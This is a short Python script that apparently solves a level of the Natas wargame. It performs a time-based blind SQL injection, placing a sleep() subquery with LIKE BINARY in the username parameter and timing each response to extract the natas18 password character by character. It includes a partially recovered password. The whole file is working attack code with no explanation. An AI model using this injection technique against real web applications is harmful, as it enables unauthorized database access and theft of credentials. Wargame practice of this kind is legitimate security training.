import config
import os, re, string, time
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

allchars = string.ascii_uppercase + string.ascii_lowercase + string.digits
guessed = "xvKIqDjy4OPv7wCRgDlmj"
query ="\" or password = (select sleep((select count(*) from users where username=\"natas18\" and password like binary \"{}%\"))) or username=\""

while len(guessed) != 32:
	for c in allchars:
		print(c)
		guess = guessed + c
		params = {"username" : query.format(guess)}
		start = time.time()
		response = get(url, auth=(user, password), params=params)
		end = time.time()
		print(response.status_code)
		if (end - start) >= 3:
			guessed += c
			break
	print("Guessed : {}".format(guessed))

print(guessed)